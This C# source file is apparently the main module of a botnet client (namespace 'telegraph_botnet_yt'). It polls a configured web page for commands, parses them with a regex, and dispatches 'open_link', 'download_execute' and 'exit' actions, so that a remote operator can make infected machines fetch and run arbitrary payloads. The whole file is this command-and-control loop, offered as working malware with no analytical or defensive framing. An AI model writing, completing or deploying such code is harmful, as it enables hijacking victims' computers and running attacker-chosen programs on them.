using System;
using System.Text.RegularExpressions;
using System.Threading;

namespace telegraph_botnet_yt
{
    class cMain
    {
        static string last_cmd = string.Empty;

        static void Main(string[] args)
        {
            while (true)
            {
                string html = web.GetHTML(configs.server);

                Match regx = Regex.Match(html, "<p>(.*)</p></article>");
                string content = regx.Groups[1].Value;

                if(last_cmd == content)
                {
                    Thread.Sleep(configs.delay);
                    continue;
                }
                last_cmd = content;

                cmd command = new cmd(content);
                Execute(command);

                Thread.Sleep(configs.delay);
            }
        }

        static void Execute(cmd CMD)
        {
            switch (CMD.ComType)
            {
                case "open_link":

                    functions.OpenLink(CMD.ComContent);
                    break;

                case "download_execute":

                    functions.DownloadExecute(CMD.ComContent);
                    break;

                case "exit":

                    Environment.Exit(0);
                    break;
            }
        }
    }
}
